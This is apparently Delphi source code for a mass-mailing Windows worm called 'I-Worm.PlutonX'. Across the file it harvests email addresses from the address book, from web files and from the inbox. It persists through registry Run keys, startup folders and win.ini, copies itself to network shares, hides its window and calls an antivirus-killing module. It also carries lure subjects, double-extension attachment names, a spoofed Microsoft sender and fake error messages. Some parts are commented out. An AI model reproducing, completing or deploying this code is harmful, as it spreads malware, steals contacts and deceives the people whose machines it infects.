UNIT IWorm;

INTERFACE

USES
  MAPI, Registry, SysUtils, Classes, StdCtrls, ExtCtrls, ComCtrls, P2P,
  Inifiles, Controls, Forms, KillAV;

TYPE
  PNetResourceA = ^TNETRESOURCEA;
  PNetResource  = ^TNETRESOURCE;

  LPDWORD =^DWORD;

  HWND = type LongWord;

  TOSVersionInfo = RECORD
   dwOSVersionInfoSize: DWORD;
   dwMajorVersion: DWORD;
   dwMinorVersion: DWORD;
   dwBuildNumber: DWORD;
   dwPlatformId: DWORD;
   szCSDVersion: ARRAY[0..127] OF AnsiChar;
  end;

  TNETRESOURCEA = RECORD
    dwScope       : DWORD;
    dwType        : DWORD;
    dwDisplayType : DWORD;
    dwUsage       : DWORD;
    lpLocalName   : pChar;
    lpRemoteName  : pChar;
    lpComment     : pChar;
    lpProvider    : pChar;
  END;

  TNETRESOURCE = RECORD
    dwScope       : DWORD;
    dwType        : DWORD;
    dwDisplayType : DWORD;
    dwUsage       : DWORD;
    lpLocalName   : pChar;
    lpRemoteName  : pChar;
    lpComment     : pChar;
    lpProvider    : pChar;
  END;

TYPE
  TForm1 = CLASS(TForm)
  Listbox1 : TListBox;
  PROCEDURE FormCreate(Sender: TObject);
  PRIVATE
  PUBLIC
  END;

  TNetEnumThread = CLASS(TThread)
    ChildNode : STRING;
    TreeNode  : TTreeNode;
    FUNCTION  LAN_RandomFileName : STRING;
    PROCEDURE Execute; OVERRIDE;
    PROCEDURE LoadNetNode(NetNode: PNetResourceA);
    PROCEDURE LAN_Infect;
    PROCEDURE LAN_Search(Path,fSpec:STRING);
    PROCEDURE LAN_CopyFiles(Hide:BOOL;SourceFile,DestinationFile:STRING);
  END;

  TTimers = CLASS
    PROCEDURE SendEmail(Sender: TObject);
    PROCEDURE AVKiller(Sender: TObject);
  END;

CONST

  NumberOfErrorMessages = 12;

  RESOURCE_GLOBALNET = 2;
  RESOURCETYPE_ANY = 0;
  NO_ERROR = 0;
  ERROR_MORE_DATA = 234;
  ERROR_NO_MORE_ITEMS = 259;
  RESOURCEUSAGE_CONNECTABLE = 1;
  RESOURCETYPE_DISK = 1;
  RESOURCEDISPLAYTYPE_SHARE = 3;
  VER_PLATFORM_WIN32_NT = 2;
  DRIVE_FIXED = 3;
  SW_HIDE = 0;
  SW_SHOW = 1;   //<- ???
  GWL_EXSTYLE = -20;
  WS_EX_TOOLWINDOW = 128;

  Chars : STRING = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';

  DNS : ARRAY[1..8] OF STRING = (
     '194.176.224.1',
     '194.176.224.2',
     '145.236.224.248',
     '194.149.0.157',
     '213.197.64.7',
     '193.194.159.159',
     '194.38.96.75',
     '152.66.116.1');

  Extensions1 : ARRAY [1..13] OF STRING = (
     'doc',
     'mp3',
     'xls',
     'wav',
     'txt',
     'jpg',
     'gif',
     'dat',
     'bmp',
     'htm',
     'mpg',
     'mdb',
     'zip');

  Extensions2 : ARRAY [1..3] OF STRING = (
     'pif',
     'bat',
     'scr');

  Bodys : ARRAY [1..8] OF STRING = (
    'Check the attachment!',
    'See the attachement!',
    'Enjoy the attachement!',
    'More details attached!',
    'Hi'+#10+#10+'Check the Attachement ..'+#10+#10+'See u',
    'Hi'+#10+#10+'Check the Attachement ..',
    'Attached one Gift for u..',
    'WOW CHECK THIS!');

  ErrorMessages : ARRAY [1..12] OF STRING = (
    'This File is Corrupted!',
    'This Software need more virtual memory!',
    'Error: Low System Performance!',
    'Error: Can Not Find Config.INI!',
    'This software need MSIO32.DLL!',
    'Application attempted to read memory at 0xFFFFFFFFh!',
    'The system cannot find the file specified.',
    'Stack overflow.',
    'Cannot allocate memory.',
    'A fatal exception 06 has occurred at <A900>:<A0973BFD>.',
    'Fatal Exception 0E has occurred at memory address in module Vxd IOS(04) + memory address.',
    'A fatal exception 0E has occurred at 0028:C02A0201 in VXD IOS(04)+00001FC9');

  Attachments : ARRAY [1..45] OF STRING = (
    'screensaver',
    'screensaver4u',
    'screensaver4u',
    'screensaverforu',
    'freescreensaver',
    'love',
    'lovers',
    'lovescr',
    'loverscreensaver',
    'loversgang',
    'loveshore',
    'love4u',
    'lovers',
    'enjoylove',
    'sharelove',
    'shareit',
    'checkfriends',
    'urfriend',
    'friendscircle',
    'friendship',
    'friends',
    'friendscr',
    'friends',
    'friends4u',
    'friendship4u',
    'friendshipbird',
    'friendshipforu',
    'friendsworld',
    'werfriends',
    'passion',
    'bullshitscr',
    'shakeit',
    'shakescr',
    'shakinglove',
    'shakingfriendship',
    'passionup',
    'rishtha',
    'greetings',
    'lovegreetings',
    'friendsgreetings',
    'friendsearch',
    'lovefinder',
    'truefriends',
    'truelovers',
    'fucker');

  Subjects : ARRAY[1..43] OF STRING = (
    'Greets!!',
    'Get 8 FREE issues - no risk!!',
    'Hi!',
    'Your News Alert!!',
    '$150 FREE Bonus!!',
    'Your Gift!',
    'New bonus in your cash account!',
    'Tools For Your Online Business!',
    'Daily Email Reminder!',
    'News',
    'Free Shipping!',
    'Its Easy!',
    'Warning!',
    'SCAM alert!!!',
    'Sponsors needed!',
    'New Reading',
    'CALL FOR INFORMATION!',
    '25 merchants and rising!',
    'Cows',
    'My eBay ads!',
    'Empty account!',
    'Market Update Report!',
    'Click on this!',
    'Fantastic!',
    'Wow!',
    'Bad news!!',
    'Lost & Found!',
    'New Contests!',
    'Today Only!!',
    'Get a FREE gift!',
    'Membership Confirmation',
    'Report',
    'Please Help...',
    'Stats',
    'I need help about script!!!',
    'Interesting...',
    'Introduction',
    'Various!',
    'Announcement!',
    'History screen!',
    'Correction of errors!',
    'Just a reminder!',
    'Payment notices!');

VAR
  Form1                  : TForm1;
  Timer1                 : TTimer;
  Timer3                 : TTimer;
  Timers                 : TTimers;
  SentEmail              : WORD;
  Emails                 : TStrings;
  NetworkDrivers         : TStrings;
  WABExists              : BOOL;
  Reg                    : TRegistry;
  Error                  : BYTE;

IMPLEMENTATION

{$R *.DFM}

FUNCTION InternetGetConnectedState(lpdwFlags:LPDWORD;dwReserved:DWORD): BOOL; STDCALL; EXTERNAL 'WININET.DLL';

FUNCTION WNetOpenEnum(dwScope,dwType,dwUsage:DWORD;lpNetResource:PNetResourceA; VAR lpEnum:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetOpenEnumA';
FUNCTION WNetEnumResource(hEnum:DWORD;VAR lpCount:DWORD;lpBuffer:Pointer;VAR lpBufferSize:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetEnumResourceA';
FUNCTION WNetCloseEnum(VAR lpEnum:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetCloseEnum';

FUNCTION GetVersionEx(var lpVersionInformation: TOSVersionInfo): BOOL; STDCALL; EXTERNAL 'kernel32.dll' name 'GetVersionExA';
FUNCTION GetDriveType(lpDisk:STRING): Integer; STDCALL; EXTERNAL 'kernel32.dll' name 'GetDriveTypeA';

FUNCTION ShowWindow(hWnd: HWND; nCmdShow: Integer): BOOL; STDCALL; EXTERNAL 'user32.DLL' name 'ShowWindow';
FUNCTION SetWindowLong(hWnd:HWND;nIndex:Integer;dwNewLong:Longint): Longint; STDCALL; EXTERNAL 'user32.DLL' name 'SetWindowLongA';
FUNCTION GetWindowLong(hWnd,nIndex:Integer) : Integer; STDCALL; EXTERNAL 'user32.DLL' name 'GetWindowLongA';

/////////////////////////////////\LAN INFECTION/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION TNetEnumThread.LAN_RandomFileName : STRING;
  VAR
  S              : STRING;
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    S:=S+Chars[Random(61)+1];
  UNTIL Length(S)=FileNameLength;
  RESULT:=S+'.exe';
END;

PROCEDURE TNetEnumThread.LAN_CopyFiles(Hide:BOOL;SourceFile,DestinationFile:STRING);
BEGIN
  CopyFile2(pChar(SourceFile),pChar(DestinationFile),False);
  IF Hide then SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
END;

PROCEDURE TNetEnumThread.LAN_Search(Path,fSpec:STRING);
VAR
  D : TSearchRec;
BEGIN
  Error:=Findfirst(Path+fSpec,faAnyfile,D);
  WHILE Error=0 DO BEGIN
 //   LAN_CopyFiles(True,ApplicationName,path+fspec+'\'+LAN_RandomFileName);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faAnyfile,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr AND faDirectory = faDirectory)AND(D.Name[1]<>'.') THEN LAN_Search(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE TNetEnumThread.Execute;
BEGIN
  TreeNode:=NIL;
  LoadNetNode(NIL);
  LAN_Infect;
END;

PROCEDURE TNetEnumThread.LAN_Infect;
VAR
  I : DWORD;
BEGIN
FOR I:=1 TO NetworkDrivers.Count-1 DO form1.listbox1.items.add(NetworkDrivers[I]);
  IF NetworkDrivers.Count>0 THEN FOR I:=0 TO NetworkDrivers.Count-1 DO LAN_Search(NetworkDrivers.Strings[I]+'\','Startup');
END;

PROCEDURE TNetEnumThread.LoadNetNode(NetNode:PNetResourceA);
VAR
  hEnum       : Cardinal;
  Count       : DWORD;
  BufSize     : DWORD;
  NR          : PNetResourceA;
  Buf         : PNetResourceA;
  R           : Integer;
  CurrentNode : TTreeNode;
BEGIN
  IF WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,NetNode,hEnum)<>NO_ERROR THEN Exit;
  BufSize:=$1;
  GetMem(Buf,BufSize);
  TRY
    WHILE True DO BEGIN
      Count:=$FFFFFFFF;                                                         // I wish to read ALL items
      R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      IF R=ERROR_MORE_DATA THEN BEGIN                                           // Oops ! The InitialSize is too small !
        Count:=$FFFFFFFF;                                                       // I wish to read ALL items
        FreeMem(Buf);
        GetMem(Buf,BufSize);
        R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      END;
      IF R=ERROR_NO_MORE_ITEMS THEN Break;                                      // All items are processed
      IF R<>NO_ERROR THEN Abort;                                                // R is the error code. Process it!
      NR:=Buf;
      WHILE Count>0 DO BEGIN
        CurrentNode:=TreeNode;                                                  // Remember current position
        IF NR.lpRemoteName<>NIL THEN ChildNode:=StrPas(NR.lpRemoteName) ELSE ChildNode:='';
        IF ((NR.dwUsage AND RESOURCEUSAGE_CONNECTABLE)<>0) AND
           (NR.dwType=RESOURCETYPE_DISK)AND                                     //Check only Disks
           (NR.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE)AND                      //Check shared resources
           (Pos('CD Drive',ChildNode)=0)AND                                     //Do not check CD Drives
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\A')AND     //Do not check A floppy drive
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\B')        //Do not check B floppy drive
           THEN NetworkDrivers.Add(ChildNode);
        LoadNetNode(NR);
        TreeNode:=CurrentNode;                                                  // restore current position after modification
        INC(NR);
        DEC(Count);
      END;
    END;
    FINALLY
    WNetCloseEnum(hEnum);                                                       // Close handle
    FreeMem(Buf);                                                               // Free memory
  END;
END;

////////////////////////////////////////////////////////////////////////////////

FUNCTION RandomFileName : STRING;
VAR
  S              : STRING;
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    S:=S+Chars[Random(61)+1];
  UNTIL Length(S)=FileNameLength;
  RESULT:=S+'.exe';
END;

PROCEDURE InfectStartUpDir;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders',True);
  S:=Reg.ReadString('Startup')+'\';
  IF S<>'' THEN CopyFiles(True,pChar(ApplicationName),pChar(S+RandomFileName));
  Reg.CloseKey;
END;

PROCEDURE InfectAllUsersStartUpDir;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders',True);
  S:=Reg.ReadString('Common Startup')+'\';
  IF S<>'' THEN CopyFiles(True,pChar(ApplicationName),pChar(S+RandomFileName));
  Reg.CloseKey;
END;

PROCEDURE WinIni;
VAR
  IniFile : TIniFile;
BEGIN
  IniFile:=TIniFile.Create('win.ini');
  IniFile.WriteString('Windows','Run','rundll32_.exe');
  IniFile.Free;
END;

PROCEDURE RegWinStart;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
  S:=AVName[Random(SizeOf(AVName) DIV 4)];
  IF Pos('.',S)>0 THEN SetLength(S,Pos('.',S)-1);
  Reg.WriteString(S,Winpath+RandomFileName);
  Reg.CloseKey;
  CopyFiles(True,pChar(ApplicationName),Winpath+RandomFileName);
END;

PROCEDURE QuickSort(Left,Right:WORD);
VAR
  Up,Down : WORD;
  Compare : STRING;
BEGIN
  Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right)DIV 2];
  REPEAT
    WHILE Emails.Strings[Up]<Compare DO Inc(Up);
    WHILE Compare<Emails.Strings[Down] DO Dec(Down);
    IF Up<=Down THEN BEGIN
      Emails.Exchange(Up,Down);
      Inc(Up);Dec(Down);
    END;
  UNTIL Up>Down;
  IF Left<Down THEN QuickSort(Left,Down);
  IF Up<Right  THEN QuickSort(Up,Right);
END;

PROCEDURE KillDupes;
VAR
  I : DWORD;
BEGIN
  FOR I:=Emails.Count-2 DOWNTO 0 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
END;

FUNCTION PlutonXRegKey : STRING;
VAR
  I    : DWORD;
  O    : WORD;
  Keys : TStrings;
  S    : STRING;
BEGIN
  Keys:=TStringList.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\SOFTWARE',False);
  Reg.GetKeyNames(Keys);

  FOR I:=0 TO Keys.Count-1 DO
    FOR O:=1 TO SizeOf(AVName) DIV 4 DO
      IF(Keys.Strings[I]=Copy(AVName[O],1,Pos('.',AVName[O])-1))AND(Reg.KeyExists(Keys.Strings[I]))AND(Keys.Strings[I]<>'') THEN BEGIN
        Reg.OpenKey('\SOFTWARE\'+Keys.Strings[I],False);
        IF(Reg.ValueExists('Sent'))AND(Reg.ValueExists('email_num')) THEN S:=Keys.Strings[I];
      END;

  RESULT:=AVName[Random(SizeOf(AVName) DIV 4)];
  IF(S='')AND(POS('.',RESULT)>0) THEN SetLength(RESULT,Pos('.',RESULT)-1)
  ELSE RESULT:=S;

  Keys.Free;
  Reg.CloseKey;
END;

PROCEDURE ReadWAB;
VAR
  WABFile : FILE;
  b,g     : DWORD;
  i       : STRING;
  n       : ARRAY[1..5] OF Char;
  xx      : ARRAY[1..500] OF Char;
  rr      : WORD;
  WABPath : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey('SOFTWARE\Microsoft\WAB\WAB4\WAB File Name',False);
  WABPath:=Reg.ReadString('');
  IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
    WABExists:=True;
    Assign(WABFile,WABPath);
    Reset(WABFile,1);
    Seek(WABFile,176199);
    REPEAT
      BlockRead(WABFile,N,5);
      IF N[1]+N[2]+N[3]+N[4]=#01+#31+#00+#03 THEN BEGIN
        BlockRead(WABFile,XX,Ord(N[5])+30);
        I:='';
        FOR RR:=1 TO Ord(N[5])+30 DO I:=I+XX[RR];
        Delete(I,1,3);
        G:=Pos(#00+#00+#00,I);
        IF G>0 THEN Delete(I,G,Length(I)-G+1);
        FOR B:=1 TO Ord(N[5]) DO IF I[B]=#00 THEN Delete(I,B,1);
        IF (Pos('@',I)>0)AND(I[1]<>'/') THEN Emails.ADD(UpperCase(I));
      END ELSE Seek(WABFile,FilePos(WABFile)-4);
    UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
    QuickSort(1,Emails.Count-1);
    KillDupes;
  END;
  IF NOT FileExists(WABPath) THEN WABExists:=False;
  Close(WABFile);
  Reg.CloseKey;
END;

PROCEDURE WriteEmailsReg;
VAR
  I : DWORD;
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\'+PlutonXRegKey, True);
  FOR I:=0 TO Emails.Count-1 DO BEGIN
    Str(I,S);
    Reg.WriteString(S,Emails.Strings[I]);
  END;
  Reg.WriteInteger('email_num',Emails.Count);
  Reg.WriteInteger('Sent',SenteMail);
  Reg.CloseKey;
END;

PROCEDURE ReadEmailsReg;
VAR
  I : DWORD;
  S : STRING;
BEGIN
  Emails.Add('I-Worm.PlutonX Created By .......');
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.OpenKey('\Software\'+PlutonXRegKey, False) THEN
    FOR I:=0 TO Reg.ReadInteger('email_num')-1 DO BEGIN
      Str(I,S);
      Emails.Add(Reg.ReadString(S));
    END;
  Reg.CloseKey;
END;

PROCEDURE GetNumberOfSentEmails;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.KeyExists('\Software\'+PlutonXRegKey) THEN BEGIN
    Reg.OpenKey('\Software\'+PlutonXRegKey, True);
    SentEmail:=Reg.ReadInteger('Sent');
  END ELSE SentEmail:=0;
  Reg.CloseKey;
END;

FUNCTION FirstRun : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  RESULT:= NOT Reg.KeyExists('\Software\'+PlutonXRegKey);
  Reg.CloseKey;
END;

PROCEDURE ReadInbox;
VAR
  OSInfo                    : TOSVersionInfo;
  Recip                     : TMAPIRecipDesc;
  MAPIMessage               : TMAPIMessage;
  lppMapiMessage            : PMapiMessage;
  MError                    : Cardinal;
  MapiSession               : DWORD;
  bFindFirst                : BOOL;
  ProfileName               : STRING;
  sSeedMessageID,sMessageID : ARRAY[0..512] OF Char;
  I                         : BYTE;
BEGIN
  OSInfo.dwOSVersionInfoSize:=sizeof(OSInfo);
  GetVersionEx(OSInfo);
  Reg.RootKey:=HKEY_CURRENT_USER;
  IF OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN BEGIN
    Reg.OpenKey('Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END ELSE BEGIN
    Reg.OpenKey('Software\Microsoft\Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END;
  TRY
    MError:=MapiLogOn(0,PChar(ProfileName),NIL,MAPI_NEW_SESSION,0,@MapiSession);
    IF (MError<>SUCCESS_SUCCESS) THEN Exit;
  EXCEPT
    ;
  END;
  bFindFirst:=True;
  FOR I:=1 TO 50 DO TRY
    IF bFindFirst THEN bFindFirst:=False ELSE sSeedMessageID:=sMessageID;
    MError:=MapiFindNext(MapiSession,0,NIL,@sSeedMessageID,0,0,@sMessageID);
    IF MError=SUCCESS_SUCCESS THEN BEGIN
      lppMapiMessage:=@MAPIMessage;
      MError:=MAPIReadMail(MAPISession,0,@sMessageID,MAPI_ENVELOPE_ONLY,0,lppMapiMessage);
      IF (MError=SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN WITH Recip DO Emails.Add(UpperCase(lppMapiMessage.lpOriginator.lpszAddress));
    END;
  EXCEPT
  END;
  QuickSort(1,Emails.Count-1);
  KillDupes;
  WriteEmailsReg;
  TRY
    MError:=MapiLogOff(MapiSession,0,0,0);
  EXCEPT
    ;
  END;
  Reg.CloseKey;
END;

PROCEDURE TTimers.SendEmail(Sender : TObject);
VAR
  S : STRING;
BEGIN
{  IF (InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(NOT SMTPRelayServer1.Busy) THEN BEGIN
    Inc(SentEmail);
    IF SentEmail>Emails.Count THEN SentEmail:=1;
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKey('\Software\'+PlutonXRegKey,True);
    Reg.WriteInteger('Sent',SentEmail);
    Reg.CloseKey;
    SMTPRelayServer1.From:='Microsoft';
    SMTPRelayServer1.HeaderFrom:='"Microsoft" <information@microsoft.com>';
    //Format('"%s" <%s>',[FFromName,FFrom]);
    SMTPRelayServer1.Subject:=Subjects[Random(43)+1];
    SMTPRelayServer1.Body.SetText(pChar(Bodys[Random(7)+1]));
    S:=Attachments[Random(5)+1]+'.'+Extensions1[Random(12)+1]+'.'+Extensions2[Random(2)+1];
    CopyFiles(True,Paramstr(0),WinPath+S);
    SMTPRelayServer1.Attachments.Clear;
    IF FileExists(WinPath+S) THEN SMTPRelayServer1.Attachments.Add(WinPath+S);
    IF FileExists(WinPath+S) THEN DeleteFile(pchar(WinPath+S));
    SMTPRelayServer1.Recipients.Clear;
    SMTPRelayServer1.Recipients.Add(Emails[SentEmail]);
    TRY
      IF SentEmail>0 THEN SMTPRelayServer1.Send;
    EXCEPT
    END;
  END;}
END;

PROCEDURE ClearEmail(S:STRING);
VAR
  B : WORD;
BEGIN
  FOR B:=Pos('@',S)+1 TO Length(S) DO
    IF ((S[B]<'a')OR(S[B]>'z'))AND((S[B]<'0')OR(S[B]>'9'))AND((S[B]<'A')OR(S[B]>'Z'))AND(S[B]<>'.')AND(S[B]<>'-')AND(S[B]<>'_') THEN BEGIN
      Delete(S,B,Length(S));
      Break;
    END;
  IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
END;

PROCEDURE FindMail(EFile:AnsiString);
VAR
  F   : Text;
  E,D : WORD;
BEGIN
  IF FileExists(EFile) THEN BEGIN
    Assign(F,EFile);
    Reset(F);
    REPEAT
      ReadLn(F,EFile);
      EFile:=UpperCase(EFile);
      E:=Pos('LTO:',EFile);
      IF E>0 THEN BEGIN
        Delete(EFile,1,E+3);
        D:=Pos('"',EFile);
        IF D>0 THEN Delete(EFile,D,Length(EFile));
        ClearEmail(EFile);
      END;
    UNTIL EOF(F);
    Close(F);
  END;
END;

PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
VAR
  D : TSearchRec;
BEGIN
  Error:=FindFirst(Path+fSpec,faAnyFile,D);
  WHILE Error=0 DO BEGIN
    FindMail(Path+D.Name);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE SearchAllDir;
VAR
  I : BYTE;
BEGIN
  FOR I:=ord('c') TO ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
END;

PROCEDURE CopyInfectedFiles;
BEGIN
  CopyFiles(True,pChar(ApplicationName),pChar(Winpath+'rundll32_.exe'));
  InfectStartUpDir;
  InfectAllUsersStartUpDir;
END;

PROCEDURE HideProject;
BEGIN
  ShowWindow(Application.Handle, SW_HIDE);
  SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW );
  ShowWindow(Application.Handle, SW_SHOW);
END;

PROCEDURE TTimers.AVKiller(Sender: TObject);
BEGIN
  KillAV.AVKiller;
END;

PROCEDURE InitTimers;
BEGIN

  Timer1:=TTimer.Create(NIL);
  Timer1.Interval:=180000;
  Timer1.Enabled:=True;
  Timer1.OnTimer:=Timers.SendEmail;

  Timer3:=TTimer.Create(NIL);
  Timer3.Interval:=5000;
  Timer3.Enabled:=True;
  Timer3.OnTimer:=Timers.AVKiller;

END;

PROCEDURE TForm1.FormCreate(Sender: TObject);
BEGIN
  Randomize;
  Reg:=TRegistry.Create;
  Emails:=TStringList.Create;
  NetworkDrivers:=TStringList.Create;
//  KillAV.AVKiller;
  ApplicationName:=Application.ExeName;

  InitTimers;
  timer1.enabled:=false;
  timer3.enabled:=false;

    TNetEnumThread.Create(False);


{  IF FirstRun THEN BEGIN
    Timer1.Enabled:=False;                                   //Disable SMTPRelayServer
    IF Pos('STARTUP',UpperCase(ApplicationName))=0 THEN BEGIN
      Application.MessageBox(pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND);
    END;
  END ELSE Timer1.Enabled:=True;
  InitPeerToPeer;
  HideProject;
  GetNumberOfSentEmails;
  CopyInfectedFiles;
  WinIni;
  IF FirstRun THEN BEGIN
    RegWinStart;
    Emails.Add('I-Worm.PlutonX Created By .......');
    SearchAllDir;
    ReadWab;
    ReadInBox;
  END ELSE BEGIN
    ReadEmailsReg;
    ReadInBox;
  END;
  TNetEnumThread.Create(False);                              //Infect LAN}

END;

END.
